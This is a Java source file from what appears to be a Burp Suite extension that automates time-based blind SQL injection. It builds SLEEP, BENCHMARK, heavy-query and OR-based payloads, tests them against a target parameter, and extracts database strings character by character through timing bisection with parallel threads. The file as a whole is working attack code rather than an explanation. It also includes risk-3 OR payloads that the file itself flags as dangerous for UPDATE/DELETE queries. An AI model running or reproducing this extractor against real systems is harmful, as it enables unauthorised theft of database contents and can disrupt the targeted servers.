package com.omnistrike.modules.exploit.omnimap.technique;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.omnistrike.modules.exploit.omnimap.OmniMapCallback;
import com.omnistrike.modules.exploit.omnimap.OmniMapConfig;
import com.omnistrike.modules.exploit.omnimap.OmniMapResult;
import com.omnistrike.modules.exploit.omnimap.dbms.DbmsDialect;
import com.omnistrike.modules.exploit.omnimap.tamper.TamperEngine;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Time-based blind SQL injection extractor for OmniMap.
 * Same bisection algorithm as BlindExtractor but uses response timing
 * instead of content comparison.
 *
 * SPEED IMPROVEMENTS:
 * - Statistical validation: requires 2 consecutive timing confirmations
 *   to avoid network jitter false positives (reduces retries vs sqlmap)
 * - Adaptive delay: starts at configured delay, increases if server is slow
 * - Parallel extraction with careful thread management to avoid overwhelming the server
 */
public class TimeExtractor {

    private final MontoyaApi api;
    private final OmniMapConfig config;
    private final DbmsDialect dialect;
    private final OmniMapCallback callback;
    private final OmniMapResult result;
    private final HttpRequestResponse originalRequest;
    private final ResponseAnalyzer analyzer;
    private volatile boolean cancelled = false;

    /** Measured baseline response time (no delay) */
    private long baselineTimeMs = 0;

    /** Adaptive delay in seconds */
    private int currentDelay;

    /** Which payload type worked during detection (used for extraction) */
    private String workingPayloadType = "AND-sleep";

    /** Full printable ASCII range */
    private static final int ASCII_MIN = 32;
    private static final int ASCII_MAX = 126;

    public TimeExtractor(MontoyaApi api, OmniMapConfig config, DbmsDialect dialect,
                         OmniMapCallback callback, OmniMapResult result,
                         HttpRequestResponse originalRequest) {
        this.api = api;
        this.config = config;
        this.dialect = dialect;
        this.callback = callback;
        this.result = result;
        this.originalRequest = originalRequest;
        this.analyzer = new ResponseAnalyzer();
        this.currentDelay = config.getTimeDelay();
    }

    public void cancel() { this.cancelled = true; }

    /**
     * Test if time-based injection works.
     * Level and risk control which time payloads are attempted:
     *
     * Level 1, Risk 1: Native sleep (SLEEP, pg_sleep, WAITFOR, DBMS_PIPE) with AND
     * Level 2+: RLIKE-based sleep variant for MySQL
     * Level 3+: ELT/MAKE_SET variants for MySQL
     *
     * Risk 2: Heavy queries as alternative to native sleep (BENCHMARK, GENERATE_SERIES, sysusers cross-join)
     * Risk 3: OR-based time payloads (dangerous for UPDATE/DELETE)
     *
     * @return true if time-based injection is viable
     */
    public boolean detect() {
        callback.onProgress("TIME: Measuring baseline response time...", 5);

        int level = config.getLevel();
        int risk = config.getRisk();

        // Measure baseline (normal request, no delay)
        long start = System.currentTimeMillis();
        var baseResp = sendPayloadRaw("");
        baselineTimeMs = System.currentTimeMillis() - start;
        if (baseResp == null || cancelled) return false;

        callback.onProgress("TIME: Baseline=" + baselineTimeMs + "ms. Testing delay...", 8);

        // Adapt delay if server is slow
        if (baselineTimeMs > 3000) {
            currentDelay = Math.max(currentDelay, (int) (baselineTimeMs / 1000) + 3);
        }

        // Build list of time payloads to try, gated by level and risk
        List<String[]> payloads = new ArrayList<>();

        // Level 1, Risk 1: native sleep with AND (always included)
        payloads.add(new String[]{buildSleepPayload("1=1"), "AND-sleep"});

        // Level 2+: MySQL — simpler direct IF sleep (no derived table)
        // sqlmap level 2: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
        if (level >= 2 && "MySQL".equals(dialect.getName())) {
            int ri = java.util.concurrent.ThreadLocalRandom.current().nextInt(1000, 10000);
            payloads.add(new String[]{
                    " AND " + ri + "=" + dialect.ifFunction(
                            "1=1", dialect.sleepFunction(currentDelay), String.valueOf(ri)) + " ",
                    "AND-IF-direct"
            });
        }

        // Level 2+: MySQL BENCHMARK as time-based (pre-5.0.12 or when SLEEP blocked)
        if (level >= 2 && "MySQL".equals(dialect.getName())) {
            payloads.add(new String[]{
                    " AND " + dialect.heavyQuery(currentDelay) + " ",
                    "AND-BENCHMARK"
            });
        }

        // Level 3+: MySQL ELT/MAKE_SET variants
        if (level >= 3 && "MySQL".equals(dialect.getName())) {
            payloads.add(new String[]{
                    " AND ELT(1=1," + dialect.sleepFunction(currentDelay) + ") ",
                    "AND-ELT-sleep"
            });
            payloads.add(new String[]{
                    " AND MAKE_SET(1=1," + dialect.sleepFunction(currentDelay) + ") ",
                    "AND-MAKE_SET-sleep"
            });
        }

        // Risk 2: heavy queries as alternative to native sleep
        if (risk >= 2) {
            payloads.add(new String[]{buildHeavyQueryPayload("1=1"), "AND-heavy-query"});
        }

        // Risk 3: OR-based time payloads (dangerous for UPDATE/DELETE!)
        if (risk >= 3) {
            payloads.add(new String[]{buildOrSleepPayload("1=1"), "OR-sleep"});
            payloads.add(new String[]{buildOrHeavyQueryPayload("1=1"), "OR-heavy-query"});
        }

        // Try each payload until one works
        for (String[] entry : payloads) {
            if (cancelled) return false;

            String payload = TamperEngine.apply(entry[0], config.getTampers());
            String label = entry[1];

            callback.onProgress("TIME: Testing " + label + "...", 8);

            long responseTime = measureResponseTime(payload);
            if (cancelled) return false;

            boolean delayed = analyzer.isTimeBased(responseTime - baselineTimeMs, currentDelay);
            if (!delayed) continue;

            // Statistical validation: confirm with a second test
            responseTime = measureResponseTime(payload);
            delayed = analyzer.isTimeBased(responseTime - baselineTimeMs, currentDelay);

            if (delayed) {
                // Store the working payload builder for extraction
                workingPayloadType = label;
                callback.onProgress("TIME: Confirmed (" + label + ")! Delay=" + currentDelay +
                        "s, response=" + responseTime + "ms", 10);
                return true;
            }
        }

        callback.onProgress("TIME: No delay detected with any payload", 0);
        return false;
    }

    /**
     * Extract a single string value using time-based blind bisection.
     * Uses fewer parallel threads than boolean blind (to avoid server overload).
     */
    public String extractSingle(String query) {
        if (cancelled) return null;

        // Step 1: Get string length
        int length = extractLength(query);
        if (length <= 0 || cancelled) return null;

        callback.onProgress("TIME: Extracting " + length + " chars...", 20);

        // Step 2: Extract characters (limited parallelism for time-based)
        int threads = Math.min(config.getThreads(), Math.max(1, length / 2));
        ExecutorService pool = Executors.newFixedThreadPool(threads);

        char[] chars = new char[length];
        AtomicBoolean anyFailed = new AtomicBoolean(false);
        List<Future<?>> futures = new ArrayList<>();

        for (int pos = 1; pos <= length && !cancelled; pos++) {
            final int charPos = pos;
            futures.add(pool.submit(() -> {
                if (cancelled || anyFailed.get()) return;
                int ascii = extractCharAtPosition(query, charPos);
                if (ascii > 0) {
                    chars[charPos - 1] = (char) ascii;
                } else {
                    chars[charPos - 1] = '?';
                }
            }));
        }

        for (Future<?> f : futures) {
            try { f.get(120, TimeUnit.SECONDS); } catch (Exception e) { break; }
        }
        pool.shutdownNow();

        return new String(chars).trim();
    }

    /**
     * Extract a list of values.
     */
    public List<String> extractList(String query) {
        List<String> results = new ArrayList<>();
        if (cancelled) return results;

        for (int offset = 0; offset < 200 && !cancelled; offset++) {
            String limited = dialect.limitOffset(query, 1, offset);
            String val = extractSingle(limited);
            if (val == null || val.isEmpty()) break;
            results.add(val.trim());
            callback.onProgress("TIME: Extracted " + results.size() + " values...",
                    Math.min(90, 20 + results.size() * 5));
        }

        return results;
    }

    /**
     * Extract string length using binary search with time-based detection.
     */
    private int extractLength(String query) {
        String lengthExpr = dialect.lengthFunction(query);
        int low = 0, high = 64;

        // Find upper bound
        while (!cancelled) {
            if (testTimedCondition(lengthExpr + ">" + high)) {
                high *= 2;
                if (high > 1024) return -1;
            } else {
                break;
            }
        }

        // Binary search
        while (low < high && !cancelled) {
            int mid = (low + high) / 2;
            if (testTimedCondition(lengthExpr + ">" + mid)) {
                low = mid + 1;
            } else {
                high = mid;
            }
        }

        return low;
    }

    /**
     * Extract ASCII value at a position using tiered adaptive bisection.
     * Critical for time-based: each wasted request costs N seconds of sleep delay.
     *
     * Tier 1: lowercase a-z (97-122) — log2(26) ≈ 5 steps + 1 range check = 6 requests
     * Tier 2: digits 0-9 (48-57)     — log2(10) ≈ 4 steps + 1 range check = 5 requests
     * Tier 3: full ASCII (32-126)     — log2(95) ≈ 7 steps, no range check  = 7 requests
     *
     * At a 5s delay, saving 1 request per char saves 5s per character extracted.
     */
    private int extractCharAtPosition(String query, int position) {
        String asciiExpr = dialect.asciiAtPosition("(" + query + ")", position);

        // Tier 1: lowercase letters (most common in DB names/values)
        int result = bisectInRange(asciiExpr, 97, 122);
        if (result > 0) return result;

        // Tier 2: digits
        result = bisectInRange(asciiExpr, 48, 57);
        if (result > 0) return result;

        // Tier 3: full printable ASCII
        return bisectFull(asciiExpr, ASCII_MIN, ASCII_MAX);
    }

    /**
     * Check if the ASCII value is within [low, high] and bisect if so.
     * Costs 1 timed request for the range check. Returns -1 if not in range.
     */
    private int bisectInRange(String asciiExpr, int low, int high) {
        if (!testTimedCondition(asciiExpr + ">=" + low + " AND " + asciiExpr + "<=" + high)) {
            return -1;
        }
        return bisectFull(asciiExpr, low, high);
    }

    /**
     * Binary search bisection using time-based detection.
     */
    private int bisectFull(String asciiExpr, int low, int high) {
        while (low < high && !cancelled) {
            int mid = (low + high) / 2;
            if (testTimedCondition(asciiExpr + ">" + mid)) {
                low = mid + 1;
            } else {
                high = mid;
            }
        }
        return cancelled ? -1 : low;
    }

    /**
     * Test a condition using time-based injection.
     * Uses the payload type that was detected as working.
     * Returns true if the response is delayed.
     */
    private boolean testTimedCondition(String condition) {
        String payload;
        if (workingPayloadType.startsWith("OR-")) {
            if (workingPayloadType.contains("heavy")) {
                payload = buildOrHeavyQueryPayload(condition);
            } else {
                payload = buildOrSleepPayload(condition);
            }
        } else if (workingPayloadType.contains("heavy")) {
            payload = buildHeavyQueryPayload(condition);
        } else if (workingPayloadType.contains("ELT")) {
            payload = " AND ELT(" + condition + "," + dialect.sleepFunction(currentDelay) + ") ";
        } else if (workingPayloadType.contains("MAKE_SET")) {
            payload = " AND MAKE_SET(" + condition + "," + dialect.sleepFunction(currentDelay) + ") ";
        } else {
            payload = buildSleepPayload(condition);
        }

        payload = TamperEngine.apply(payload, config.getTampers());
        long responseTime = measureResponseTime(payload);
        return analyzer.isTimeBased(responseTime - baselineTimeMs, currentDelay);
    }

    /**
     * Build AND-based native sleep payload (level 1).
     * MySQL: AND (SELECT * FROM (SELECT(SLEEP(N)))abc) when unconditional
     *        AND IF(condition,SLEEP(N),0) wrapped in subquery when conditional
     * Others: AND (SELECT CASE WHEN (cond) THEN sleep ELSE 0 END)
     */
    private String buildSleepPayload(String condition) {
        if ("MySQL".equals(dialect.getName())) {
            if ("1=1".equals(condition)) {
                return " AND (SELECT * FROM (SELECT(" + dialect.sleepFunction(currentDelay) + "))abc) ";
            } else {
                String sleepExpr = dialect.ifFunction(condition, dialect.sleepFunction(currentDelay), "0");
                return " AND (SELECT " + sleepExpr + ") ";
            }
        } else {
            String sleepExpr = dialect.ifFunction(condition, dialect.sleepFunction(currentDelay), "0");
            return " AND (SELECT " + sleepExpr + ") ";
        }
    }

    /**
     * Build AND-based heavy query payload (risk 2+).
     * Uses BENCHMARK, GENERATE_SERIES, cross-joins instead of native sleep.
     */
    private String buildHeavyQueryPayload(String condition) {
        String heavyExpr = dialect.ifFunction(condition, dialect.heavyQuery(currentDelay), "0");
        return " AND (SELECT " + heavyExpr + ") ";
    }

    /**
     * Build OR-based native sleep payload (risk 3).
     * Dangerous for UPDATE/DELETE queries!
     */
    private String buildOrSleepPayload(String condition) {
        if ("MySQL".equals(dialect.getName())) {
            if ("1=1".equals(condition)) {
                return " OR (SELECT * FROM (SELECT(" + dialect.sleepFunction(currentDelay) + "))abc) ";
            } else {
                String sleepExpr = dialect.ifFunction(condition, dialect.sleepFunction(currentDelay), "0");
                return " OR (SELECT " + sleepExpr + ") ";
            }
        } else {
            String sleepExpr = dialect.ifFunction(condition, dialect.sleepFunction(currentDelay), "0");
            return " OR (SELECT " + sleepExpr + ") ";
        }
    }

    /**
     * Build OR-based heavy query payload (risk 3).
     */
    private String buildOrHeavyQueryPayload(String condition) {
        String heavyExpr = dialect.ifFunction(condition, dialect.heavyQuery(currentDelay), "0");
        return " OR (SELECT " + heavyExpr + ") ";
    }

    /**
     * Measure response time for a payload.
     */
    private long measureResponseTime(String payload) {
        long start = System.currentTimeMillis();
        sendPayload(payload);
        return System.currentTimeMillis() - start;
    }

    /**
     * Send payload and log it.
     */
    private burp.api.montoya.http.message.responses.HttpResponse sendPayload(String payload) {
        try {
            HttpRequest req = PayloadInjector.inject(originalRequest.request(),
                    config.getParameterName(), config.getParameterType(),
                    config.getPrefix() + payload + (config.getSuffix().isEmpty() ? "" : config.getSuffix()));
            long start = System.currentTimeMillis();
            HttpRequestResponse rr = api.http().sendRequest(req);
            long elapsed = System.currentTimeMillis() - start;
            result.incrementRequestCount();
            callback.onRequestSent(rr, payload, "TIME", elapsed);
            return rr.response();
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Send raw payload without tracking (for baseline measurement).
     */
    private burp.api.montoya.http.message.responses.HttpResponse sendPayloadRaw(String payload) {
        try {
            HttpRequest req = payload.isEmpty() ? originalRequest.request()
                    : PayloadInjector.inject(originalRequest.request(),
                    config.getParameterName(), config.getParameterType(), payload);
            HttpRequestResponse rr = api.http().sendRequest(req);
            result.incrementRequestCount();
            return rr.response();
        } catch (Exception e) {
            return null;
        }
    }

}
